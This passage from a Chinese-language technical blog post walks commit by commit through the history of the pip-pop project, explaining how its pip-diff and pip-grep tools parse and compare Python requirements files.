<p><code>main()</code>函数源代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    args = docopt(__doc__, version=<span class="string">'pip-diff'</span>)</div><div class="line"></div><div class="line">    kwargs = &#123;</div><div class="line">        <span class="string">'r1'</span>: args[<span class="string">'&lt;reqfile1&gt;'</span>],</div><div class="line">        <span class="string">'r2'</span>: args[<span class="string">'&lt;reqfile2&gt;'</span>],</div><div class="line">        <span class="string">'include_fresh'</span>: args[<span class="string">'--fresh'</span>],</div><div class="line">        <span class="string">'include_stale'</span>: args[<span class="string">'--stale'</span>]</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    diff(**kwargs)</div></pre></td></tr></table></figure></p>
<p>通过<code>args = docopt(__doc__, version=&#39;pip-diff&#39;)</code> 来获取对应的命令行参数，参数要求见程序开头的那一段注释:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Usage:</div><div class="line">  pip-diff (--fresh | --stale) &lt;reqfile1&gt; &lt;reqfile2&gt;</div><div class="line">  pip-diff (-h | --help)</div><div class="line"></div><div class="line">Options:</div><div class="line">  -h --help     Show this screen.</div><div class="line">  --fresh       List newly added packages.</div><div class="line">  --stale       List removed packages.</div></pre></td></tr></table></figure></p>
<p><code>args</code>解析完命令行参数后，会返回一个<code>Dict</code>类型。然后通过<code>kwargs</code>解析出对应的变量。。<code>--fresh</code>和<code>--stale</code>的作用是<code>Generates a diff between two given requirements files. Lists either stale or fresh packages.</code>。以命令行参数<code>--fresh D:\temp\req1 D:\temp\req2</code>为例</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20180726/1.jpg" alt=""></p>
<p>然后程序进入<code>diff(**kwargs)</code>， diff函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">diff</span><span class="params">(r1, r2, include_fresh=False, include_stale=False)</span>:</span></div><div class="line">    <span class="comment"># assert that r1 and r2 are files.</span></div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        r1 = Requirements(r1)</div><div class="line">        r2 = Requirements(r2)</div><div class="line">    <span class="keyword">except</span> ValueError:</div><div class="line">        <span class="keyword">print</span> <span class="string">'There was a problem loading the given requirements files.'</span></div><div class="line">        exit(os.EX_NOINPUT)</div><div class="line"></div><div class="line">    results = r1.diff(r2)</div><div class="line">    <span class="keyword">print</span> results</div></pre></td></tr></table></figure></p>
<p><code>Requirements</code>对象定义如下，其中的<code>diff</code>函数先暂时省略：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requirements</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""docstring for Requirements"""</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, reqfile=None)</span>:</span></div><div class="line">        super(Requirements, self).__init__()</div><div class="line">        self.path = reqfile</div><div class="line">        self.requirements = []</div><div class="line"></div><div class="line">        <span class="keyword">if</span> reqfile:</div><div class="line">            self.load(reqfile)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;Requirements \'&#123;&#125;\'&gt;'</span>.format(self.path)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self, reqfile)</span>:</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(reqfile):</div><div class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'The given requirements file does not exist.'</span>)</div><div class="line"></div><div class="line">        <span class="keyword">with</span> open(reqfile) <span class="keyword">as</span> f:</div><div class="line">            data = []</div><div class="line"></div><div class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</div><div class="line">                line = line.strip()</div><div class="line"></div><div class="line">                <span class="comment"># Skip lines that start with any comment/control charecters.</span></div><div class="line">                <span class="keyword">if</span> <span class="keyword">not</span> any([line.startswith(p) <span class="keyword">for</span> p <span class="keyword">in</span> IGNORABLE_LINES]):</div><div class="line">                    data.append(line)</div><div class="line"></div><div class="line">            <span class="keyword">for</span> requirement <span class="keyword">in</span> parse_requirements(data):</div><div class="line">                self.requirements.append(requirement)</div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment"># assert that the given file exists</span></div><div class="line">        <span class="comment"># parse the file</span></div><div class="line">        <span class="comment"># insert those entries into self.declarations</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">diff</span><span class="params">(self, requirements, ignore_versions=False)</span>:</span></div><div class="line">        。。。</div></pre></td></tr></table></figure></p>
<p>以<code>Requirements(r1)</code>为例，传入的参数为<code>D:\\temp\\req1</code>，在<code>__init__</code>中进入<code>self.load(reqfile)</code>，首先判断了文件的存在。然后对于文件中的每一行（<code>for line in f:</code>），去除它末尾的换行符（<code>line = line.strip()</code>），然后判断其是否以注释或控制字符开头（<code>[line.startswith(p) for p in IGNORABLE_LINES]</code>），若不是则将其加入到<code>data</code>中。之后调用<code>parse_requirements(data)</code>进行解析：<br><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20180726/2.jpg" alt=""></p>
<p>在pass之后，返回给<code>r1</code><br><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20180726/3.jpg" alt=""></p>
<p>在<code>r2</code>对象实例化后，进行<code>results = r1.diff(r2)</code>，在<code>class Requirements(object)</code>中定义了diff方法代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requirements</span><span class="params">(object)</span>:</span></div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">diff</span><span class="params">(self, requirements, ignore_versions=False)</span>:</span></div><div class="line">        r1 = self</div><div class="line">        r2 = requirements</div><div class="line">        results = &#123;<span class="string">'fresh'</span>: [], <span class="string">'stale'</span>: []&#125;</div><div class="line"></div><div class="line">        <span class="comment"># Generate fresh packages.</span></div><div class="line">        other_reqs = (</div><div class="line">            [r.project_name <span class="keyword">for</span> r <span class="keyword">in</span> r1.requirements]</div><div class="line">            <span class="keyword">if</span> ignore_versions <span class="keyword">else</span> r1.requirements</div><div class="line">        )</div><div class="line"></div><div class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> r2.requirements:</div><div class="line">            r = req.project_name <span class="keyword">if</span> ignore_versions <span class="keyword">else</span> req</div><div class="line"></div><div class="line">            <span class="keyword">if</span> r <span class="keyword">not</span> <span class="keyword">in</span> other_reqs:</div><div class="line">                results[<span class="string">'fresh'</span>].append(req)</div><div class="line"></div><div class="line">        <span class="comment"># Generate stale packages.</span></div><div class="line">        other_reqs = (</div><div class="line">            [r.project_name <span class="keyword">for</span> r <span class="keyword">in</span> r2.requirements]</div><div class="line">            <span class="keyword">if</span> ignore_versions <span class="keyword">else</span> r2.requirements</div><div class="line">        )</div><div class="line"></div><div class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> r1.requirements:</div><div class="line">            r = req.project_name <span class="keyword">if</span> ignore_versions <span class="keyword">else</span> req</div><div class="line"></div><div class="line">            <span class="keyword">if</span> r <span class="keyword">not</span> <span class="keyword">in</span> other_reqs:</div><div class="line">                results[<span class="string">'stale'</span>].append(req)</div><div class="line"></div><div class="line">        <span class="keyword">return</span> results</div></pre></td></tr></table></figure></p>
<h1 id="output-for-pip-diff-works"><a href="#output-for-pip-diff-works" class="headerlink" title="output for pip-diff works!"></a>output for pip-diff works!</h1><p>commit记录： d6ae563831228dd6d7e712d69763663032410391</p>
<p>项目结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── LICENSE</div><div class="line">├── README.rst</div><div class="line">├── bin</div><div class="line">│   ├── pip-diff</div><div class="line">│   └── pip-flatten</div><div class="line">├── pip_pop</div><div class="line">│   └── __init__.py</div><div class="line">├── requirements.txt</div><div class="line">└── setup.py</div><div class="line"></div><div class="line">2 directories, 7 files</div></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181011/1.jpg" alt=""></p>
<p>根据参数的不同<code>fresh</code>或者<code>stale</code>，输出对应的结果。</p>
<p>req1内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">req1</div><div class="line">test1</div></pre></td></tr></table></figure></p>
<p>req2内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">req2</div><div class="line">test2</div></pre></td></tr></table></figure></p>
<p>则运行结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">C:\Python27\python.exe D:/Learn/opensource/pip-pop/bin/pip-diff --stale D:\temp\req1 D:\temp\req2</div><div class="line">req1</div><div class="line">test1</div><div class="line"></div><div class="line">C:\Python27\python.exe D:/Learn/opensource/pip-pop/bin/pip-diff --fresh D:\temp\req1 D:\temp\req2</div><div class="line">req2</div><div class="line">test2</div></pre></td></tr></table></figure></p>
<h1 id="cleanup"><a href="#cleanup" class="headerlink" title="cleanup"></a>cleanup</h1><p>commit记录： 2c2ffe318e5c539fc3bdef4feda97c56c162062a</p>
<p>项目结构及代码部分未做改变。</p>
<p>删除了原 <code>pip-diff</code> 中的一些注释</p>
<h1 id="tuples"><a href="#tuples" class="headerlink" title="tuples"></a>tuples</h1><p>commit记录： 58f9ae5f9668a7613f7c0f9f1c43a105b2604891</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/1.jpg" alt=""></p>
<p>将<code>VERSION_OPERATORS</code>从<code>list</code>改为<code>tuple</code> 。 其余无变化。</p>
<h1 id="remove-bunk-files"><a href="#remove-bunk-files" class="headerlink" title="remove bunk files"></a>remove bunk files</h1><p>commit记录： d1ff1029ca3d4bd765abe2d4e92b1c2700586702</p>
<p>项目结构变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">│  LICENSE</div><div class="line">│  README.rst</div><div class="line">│  requirements.txt</div><div class="line">│  setup.py</div><div class="line">└─bin</div><div class="line">        pip-diff</div><div class="line">        pip-flatten</div></pre></td></tr></table></figure></p>
<p>删除了<code>pip-pop/__init__.py</code>空文件</p>
<h1 id="rely-on-pip"><a href="#rely-on-pip" class="headerlink" title="rely on pip"></a>rely on pip</h1><p>commit记录： d638b182d9302fa541efa48fbf99fa05f42a4565</p>
<p>项目结构未变</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/2.jpg" alt=""></p>
<p>利用pip.req来解析req文件</p>
<h1 id="getting-simpler-and-simpler"><a href="#getting-simpler-and-simpler" class="headerlink" title="getting simpler and simpler!"></a>getting simpler and simpler!</h1><p>commit记录：69d9e22c10734d463bde67c04cc469f0b0bce072</p>
<p>项目结构未变</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/3.jpg" alt=""></p>
<p>因为直接利用pip.req来解析req文件，删除无用变量</p>
<h1 id="only-check-lines-that-have-explicit-requirements"><a href="#only-check-lines-that-have-explicit-requirements" class="headerlink" title="only check lines that have explicit requirements"></a>only check lines that have explicit requirements</h1><p>commit记录： 0837d1133ee25c645d763f670f6683a20bf30240<br><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/4.jpg" alt=""></p>
<p>只有当<code>requirement.req</code>为真时，才添加到<code>self.requirements</code>中。</p>
<p>附上最新版的pip中的 <code>parse_requirements</code>的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># C:/Python27/Lib/site-packages/pip/req/req_file.py:64</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_requirements</span><span class="params">(filename, finder=None, comes_from=None, options=None,</span></span></div><div class="line">                       session=None, constraint=False, wheel_cache=None):</div><div class="line">    <span class="string">"""Parse a requirements file and yield InstallRequirement instances.</span></div><div class="line"></div><div class="line">    :param filename:    Path or url of requirements file.</div><div class="line">    :param finder:      Instance of pip.index.PackageFinder.</div><div class="line">    :param comes_from:  Origin description of requirements.</div><div class="line">    :param options:     cli options.</div><div class="line">    :param session:     Instance of pip.download.PipSession.</div><div class="line">    :param constraint:  If true, parsing a constraint file rather than</div><div class="line">        requirements file.</div><div class="line">    :param wheel_cache: Instance of pip.wheel.WheelCache</div><div class="line">    """</div><div class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">raise</span> TypeError(</div><div class="line">            <span class="string">"parse_requirements() missing 1 required keyword argument: "</span></div><div class="line">            <span class="string">"'session'"</span></div><div class="line">        )</div><div class="line"></div><div class="line">    _, content = get_file_content(</div><div class="line">        filename, comes_from=comes_from, session=session</div><div class="line">    )</div><div class="line"></div><div class="line">    lines_enum = preprocess(content, options)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> line_number, line <span class="keyword">in</span> lines_enum:</div><div class="line">        req_iter = process_line(line, filename, line_number, finder,</div><div class="line">                                comes_from, options, session, wheel_cache,</div><div class="line">                                constraint=constraint)</div><div class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> req_iter:</div><div class="line">            <span class="keyword">yield</span> req</div></pre></td></tr></table></figure></p>
<p>最后会返回一个迭代器</p>
<h1 id="initial-version-of-pip-grep"><a href="#initial-version-of-pip-grep" class="headerlink" title="initial version of pip-grep"></a>initial version of pip-grep</h1><p>commit记录： 3862c2f9a2f72bb962e7ed15416109ee0ec3e5ae</p>
<p>项目结构变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">│  LICENSE</div><div class="line">│  README.rst</div><div class="line">│  requirements.txt</div><div class="line">│  setup.py</div><div class="line">└─bin</div><div class="line">        pip-diff</div><div class="line">        pip-grep</div></pre></td></tr></table></figure></p>
<p><code>setup.py</code>中：<br><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/5.jpg" alt=""></p>
<p><code>pip-flatten</code>变为<code>pip-grep</code>，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""Usage:</span></div><div class="line">  pip-grep &lt;reqfile&gt; &lt;package&gt;...</div><div class="line"></div><div class="line">Options:</div><div class="line">  -h --help     Show this screen.</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> docopt <span class="keyword">import</span> docopt</div><div class="line"><span class="keyword">from</span> pip.req <span class="keyword">import</span> parse_requirements</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requirements</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, reqfile=None)</span>:</span></div><div class="line">        super(Requirements, self).__init__()</div><div class="line">        self.path = reqfile</div><div class="line">        self.requirements = []</div><div class="line"></div><div class="line">        <span class="keyword">if</span> reqfile:</div><div class="line">            self.load(reqfile)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;Requirements \'&#123;&#125;\'&gt;'</span>.format(self.path)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self, reqfile)</span>:</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(reqfile):</div><div class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'The given requirements file does not exist.'</span>)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> requirement <span class="keyword">in</span> parse_requirements(reqfile):</div><div class="line">            self.requirements.append(requirement)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">grep</span><span class="params">(reqfile, packages)</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># 读取reqfile文件并解析</span></div><div class="line">        r = Requirements(reqfile)</div><div class="line">    <span class="keyword">except</span> ValueError:</div><div class="line">        <span class="keyword">print</span> <span class="string">'There was a problem loading the given requirement file.'</span></div><div class="line">        exit(os.EX_NOINPUT)</div><div class="line">    <span class="comment"># 对于reuqirement中的每一个</span></div><div class="line">    <span class="keyword">for</span> requirement <span class="keyword">in</span> r.requirements:</div><div class="line">        <span class="keyword">if</span> requirement.req.project_name <span class="keyword">in</span> packages:</div><div class="line">            <span class="comment"># 如果找到了在 packages中</span></div><div class="line">            <span class="keyword">print</span> <span class="string">'Package &#123;&#125; found!'</span>.format(requirement.req.project_name)</div><div class="line">            exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">'Not found.'</span>.format(requirement.req.project_name)</div><div class="line">        exit(<span class="number">1</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># 获取参数</span></div><div class="line">    args = docopt(__doc__, version=<span class="string">'pip-grep'</span>)</div><div class="line"></div><div class="line">    kwargs = &#123;<span class="string">'reqfile'</span>: args[<span class="string">'&lt;reqfile&gt;'</span>], <span class="string">'packages'</span>: args[<span class="string">'&lt;package&gt;'</span>]&#125;</div><div class="line"></div><div class="line">    <span class="comment"># 传入 reqfile package</span></div><div class="line">    grep(**kwargs)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<h1 id="updated-readme"><a href="#updated-readme" class="headerlink" title="updated readme"></a>updated readme</h1><p>commit记录：2116d8a7698bf8fece0ad5c32db9ec9f69c97e69</p>
<p>更新readme文档，添加pip-grep的使用说明</p>
<h1 id="fix-for-pip-grep"><a href="#fix-for-pip-grep" class="headerlink" title="fix for pip-grep"></a>fix for pip-grep</h1><p>commit记录：2116d8a7698bf8fece0ad5c32db9ec9f69c97e69</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/6.jpg" alt=""></p>
<h1 id="silent-mode-for-pip-grep"><a href="#silent-mode-for-pip-grep" class="headerlink" title="silent mode for pip-grep"></a>silent mode for pip-grep</h1><p>commit记录： 78e3c31b3584bfb263c061317ccc798cfaddf061</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/7.jpg" alt=""></p>
<p>增加silent参数选项。作用位置</p>
<h1 id="silence-“not-found”"><a href="#silence-“not-found”" class="headerlink" title="silence “not found”"></a>silence “not found”</h1><p>commit记录： 94c553879358aff40da2c3d2f536acb184703166</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/8.jpg" alt=""></p>
<p>添加<code>silent</code>模式对<code>not found</code>情况的支持</p>
<h1 id="python-3-compatibility"><a href="#python-3-compatibility" class="headerlink" title="python 3 compatibility"></a>python 3 compatibility</h1><p>commit纪录：70af45d95fd38e0a93abdbdb400283dcc495a00f</p>
<p>修改了<code>pip-grep</code>和<code>pip-diff</code>，将其中的<code>print &#39;xx&#39;</code> 改为<code>print(&#39;xx&#39;)</code></p>
<h1 id="Add-a-dummy-finder-so-parse-requirement-does-not-fail-on-—arguments"><a href="#Add-a-dummy-finder-so-parse-requirement-does-not-fail-on-—arguments" class="headerlink" title="Add a dummy finder so parse_requirement does not fail on —arguments"></a>Add a dummy finder so parse_requirement does not fail on —arguments</h1><p>commit记录：2aa545fb3b80d78670d923be4333e85f0abb7309</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pip.index <span class="keyword">import</span> PackageFinder</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requirements</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line">    。。。</div><div class="line"></div><div class="line">    finder = PackageFinder([], [])</div><div class="line">    <span class="keyword">for</span> requirement <span class="keyword">in</span> parse_requirements(reqfile, finder=finder):</div><div class="line">        self.requirements.append(requirement)</div><div class="line"></div><div class="line">    。。。</div></pre></td></tr></table></figure>
<p>新增加一个<code>finder=finder</code>参数，避免<code>parse_requirements</code>失败。</p>
<h1 id="v0-1-0"><a href="#v0-1-0" class="headerlink" title="v0.1.0"></a>v0.1.0</h1><p>commit记录：2dc013300c4b0fb605fa9dd2a3fba5ecc81ac20c</p>
<p>修改<code>setup.py</code>，修改版本号为<code>version=&#39;0.1.0&#39;</code></p>
<h1 id="Add-option-to-print-the-requirement-if-found"><a href="#Add-option-to-print-the-requirement-if-found" class="headerlink" title="Add option to print the requirement, if found"></a>Add option to print the requirement, if found</h1><p>commit记录： a3f9a4ba40c02d6bc26318e589ae2db11304203f</p>
<p>修改<code>pip-grep</code>文件。</p>
<p>首先是Usage部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&quot;&quot;&quot;Usage:</div><div class="line">  pip-grep [-sp] &lt;reqfile&gt; &lt;package&gt;...</div><div class="line"></div><div class="line">Options:</div><div class="line">  -h --help         Show this screen.</div><div class="line">  -s --silent       Suppress output.</div><div class="line">  -p --print-req    If found, print the requirement.</div><div class="line">&quot;&quot;&quot;</div></pre></td></tr></table></figure></p>
<p><code>-p</code>，在grep找到的情况下，打印出requirement</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/9.jpg" alt=""></p>
<h1 id="support-for-lastest-pip"><a href="#support-for-lastest-pip" class="headerlink" title="support for lastest pip"></a>support for lastest pip</h1><p>commit记录： 27f35700c7d8affb1fc3b399bd77fe38fb82bba1</p>
<p>修改<code>pip-diff</code>。</p>
<p>由于<code>parse_requirements</code>中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_requirements</span><span class="params">(filename, finder=None, comes_from=None, options=None,</span></span></div><div class="line">                       session=None, constraint=False, wheel_cache=None):</div><div class="line"></div><div class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">raise</span> TypeError(</div><div class="line">            <span class="string">"parse_requirements() missing 1 required keyword argument: "</span></div><div class="line">            <span class="string">"'session'"</span></div><div class="line">        )</div></pre></td></tr></table></figure></p>
<p>所以添加<code>session</code>参数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pip._vendor.requests <span class="keyword">import</span> session</div><div class="line"></div><div class="line">requests = session()</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requirements</span><span class="params">(object)</span>:</span></div><div class="line">    。。。</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self, reqfile)</span>:</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(reqfile):</div><div class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'The given requirements file does not exist.'</span>)</div><div class="line"></div><div class="line">        finder = PackageFinder([], [], session=requests)</div><div class="line">        <span class="keyword">for</span> requirement <span class="keyword">in</span> parse_requirements(reqfile, finder=finder):</div><div class="line">            <span class="keyword">if</span> requirement.req:</div><div class="line">                self.requirements.append(requirement.req)</div></pre></td></tr></table></figure></p>
<h1 id="Update-pip-grep"><a href="#Update-pip-grep" class="headerlink" title="Update pip-grep"></a>Update pip-grep</h1><p>commit记录：90eba89335af5aa1285d179aa9ea6aa9725bd712</p>
<p>修改内容同上，增加<code>session</code>参数。</p>
